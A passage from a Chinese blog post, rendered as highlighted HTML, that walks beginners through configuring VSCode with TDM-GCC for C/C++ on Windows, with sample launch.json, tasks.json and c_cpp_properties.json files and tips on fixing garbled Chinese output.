https://go.microsoft.com/fwlink/?linkid=830387</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;0.2.0&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;configurations&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C++ Run&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cppdbg&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;request&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;launch&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;program&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceRoot&#125;/Debug/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//运行文件的路径</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;stopAtEntry&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cwd&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;environment&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;console&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;internalConsole&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;internalConsoleOptions&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;neverOpen&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;MIMode&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gdb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;miDebuggerPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:/TDM-GCC-64/gdb64/bin/gdb.exe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;setupCommands&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;description&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;为 gdb 启用整齐打印&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;text&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;-enable-pretty-printing&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;ignoreFailures&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;preLaunchTask&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile&quot;</span> <span class=\"comment\">//运行前需要完成的任务</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C Run&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cppdbg&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;request&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;launch&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;program&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceRoot&#125;/Debug/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//运行文件的路径</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;stopAtEntry&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cwd&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;environment&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;console&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;internalConsole&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;internalConsoleOptions&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;neverOpen&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;MIMode&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gdb&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;miDebuggerPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:/TDM-GCC-64/gdb64/bin/gdb.exe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;setupCommands&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;description&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;为 gdb 启用整齐打印&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;text&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;-enable-pretty-printing&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;ignoreFailures&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;preLaunchTask&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile_C&quot;</span> <span class=\"comment\">//运行前需要完成的任务</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n<li><p>在 <code>.vscode</code> 文件夹中新建文件 <code>tasks.json</code> 并输入如下内容：</p>\n <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;2.0.0&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;tasks&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;label&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;command&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;g++&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-g&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;file&#125;&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//指定编译源代码文件</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-o&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;workspaceRoot&#125;\\\\Debug\\\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 指定输出文件名，不加该参数则默认输出a.exe</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-ggdb3&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 生成和调试有关的信息</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wall&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 开启额外警告</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-static-libgcc&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 静态链接</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-std=c++2a&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wno-format&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-finput-charset=UTF-8&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//输入编译器文本编码 默认为UTF-8</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-fexec-charset=UTF-8&quot;</span> <span class=\"comment\">//编译器输出文本编码 自行选择</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shell&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;presentation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;echo&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;reveal&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;silent&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 在“终端”中显示编译信息的策略，可以为always，silent，never</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;focus&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;panel&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shared&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 不同的文件的编译信息共享一个终端面板</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;clear&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;showReuseMessage&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;problemMatcher&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;owner&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cpp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fileLocation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"string\">&quot;relative&quot;</span><span class=\"punctuation\">,</span> <span class=\"string\">&quot;\\\\&quot;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;pattern&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;regexp&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;file&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;line&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;column&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;severity&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">4</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;message&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">5</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;label&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Compile_C&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;command&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gcc&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;args&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-g&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;file&#125;&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//指定编译源代码文件</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-o&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;workspaceRoot&#125;\\\\Debug\\\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 指定输出文件名，不加该参数则默认输出a.exe</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-ggdb3&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 生成和调试有关的信息</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wall&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 开启额外警告</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-static-libgcc&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 静态链接</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-Wno-format&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-finput-charset=UTF-8&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">//输入编译器文本编码 默认为UTF-8</span></span><br><span class=\"line\">        <span class=\"string\">&quot;-fexec-charset=UTF-8&quot;</span> <span class=\"comment\">//编译器输出文本编码 自行选择</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shell&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;presentation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;echo&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;reveal&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;silent&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 在“终端”中显示编译信息的策略，可以为always，silent，never</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;focus&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">false</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;panel&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;shared&quot;</span><span class=\"punctuation\">,</span> <span class=\"comment\">// 不同的文件的编译信息共享一个终端面板</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;clear&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;showReuseMessage&quot;</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"attr\">&quot;problemMatcher&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;owner&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;cpp&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;fileLocation&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"string\">&quot;relative&quot;</span><span class=\"punctuation\">,</span> <span class=\"string\">&quot;\\\\&quot;</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;pattern&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;regexp&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;file&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;line&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">2</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;column&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">3</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;severity&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">4</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;message&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">5</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n<li><p>类似的，配置 <code>c_cpp_properties.json</code> ，这个我不知道要不要（逃</p>\n <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;configurations&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;Win32&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;includePath&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;$&#123;workspaceFolder&#125;/**&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;defines&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">        <span class=\"string\">&quot;_DEBUG&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;UNICODE&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"string\">&quot;_UNICODE&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;compilerPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;C:/TDM-GCC-64/bin/g++.exe&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cStandard&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;c11&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;cppStandard&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;c++20&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;intelliSenseMode&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;gcc-x64&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;macFrameworkPath&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;browse&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;path&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">          <span class=\"string\">&quot;C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/*&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"string\">&quot;C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/c++/*&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">]</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n<p>搬砖完毕（逃</p>\n<h2 id=\"中文乱码\"><a href=\"#中文乱码\" class=\"headerlink\" title=\"中文乱码\"></a>中文乱码</h2><p>VSCode 中默认终端常为 PowerShell ，Windows 10 中 PowerShell 默认编码跟随系统，可以通过修改区域设置来改变默认编码： 控制面板-&gt;区域-&gt;更改系统区域设置-&gt;勾选 <code>Beta版：使用Unicode:UTF-8以获取全球语言支持</code>，但这样可能会造成其他应用乱码，笔者就因为这个事情改回去了。</p>\n<h2 id=\"VSCode-使用的注意事项\"><a href=\"#VSCode-使用的注意事项\" class=\"headerlink\" title=\"VSCode 使用的注意事项\"></a>VSCode 使用的注意事项</h2><blockquote>\n<p>虽说 VSCode 好，但有几点注意的，被坑过。。。</p>\n</blockquote>\n<ol>\n<li>不要直接<strong>在文件夹双击打开 .c 文件</strong>启动 VSCode</li>\n<li>不要给 .c 文件起<strong>中文名</strong></li>\n<li>不要在<strong>其他文件夹</strong>（除了你最初配置好的文件夹，比如桌面）中启动 VSCode</li>\n<li>以上配置无法进行<strong>多文件编译</strong></li>\n<li>以上说法仅针对初学者，均不严谨</li>\n</ol>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><blockquote>\n<p><a href=\"https://blog.gztime.cc/posts/2020/6b9b4626/\">Visual Studio Code Guide</a> by GZTime<br><a href=\"https://blog.csdn.net/m0_55005568/article/details/119960552\">https://blog.csdn.net/m0_55005568/article/details/119960552</a></p>\n</blockquote>\n","excerpt":"<p>一句话：VSCode 确实是一个好东西</p>","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>在用 VSCode 前，我写 C 一直用的是 VS2019 ，直到我看见了 GZTime 学长写的 <a href=\"https://blog.gztime.cc/posts/2020/6b9b4626/\">Visual Studio Code Guide</a> 一文并照着配了后，我乐了，原来 VSCode 如此好用。首先作为一个编辑器，它比 VS2019 这个 IDE 小了太多（一个几十 MB ，一个 10 个 GB ），其次，它配上 gcc 可以避免 VS2019 由于 msvc 导致的 <code>scanf_s</code> 等一堆 <code>_s</code>（或许我的表述不是太严谨，但差不多是这个意思）。<br>本文高度概括了学长的文章，说是转载也不为过，读者根据自身水平可酌情移步至<a href=\"https://blog.gztime.cc/posts/2020/6b9b4626/\">原文</a>。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h3><p><a href=\"https://wwi.lanzouw.com/b00v71rpc\">下载链接</a></p>\n<h3 id=\"注意事项\"><a 